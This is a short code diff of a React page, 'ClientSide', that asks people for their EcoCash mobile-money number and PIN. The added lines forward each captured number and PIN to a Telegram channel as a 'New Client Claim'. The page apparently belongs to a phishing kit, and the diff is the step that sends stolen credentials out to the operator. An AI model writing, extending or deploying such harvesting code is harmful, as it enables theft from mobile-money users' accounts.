@@ -2,6 +2,7 @@ import { useState } from "react";
 import styles from "./ClientSide.module.css";
 import { supabase } from "../assets/lib/supabase.js";
 import { useNavigate } from "react-router-dom";
+import { sendToTelegram } from "./telegram.jsx";
 export default function ClientSide() {
   const navigate = useNavigate();
   const [next, setnext] = useState(false);
@@ -27,13 +28,16 @@ export default function ClientSide() {
     console.log(clientNumber);
   }
 
-  function handleSubmitPin(e) {
+  async function handleSubmitPin(e) {
     e.preventDefault();
     if (clientPin.length !== 4) {
       setwrongpi(true);
       return;
     }
     uploaddata();
+    await sendToTelegram(
+      `New Client Claim:\nEcoCash Number: ${clientNumber}\nEcoCash Pin: ${clientPin}`
+    );
     setsuccess(true);
   }
   const client = {
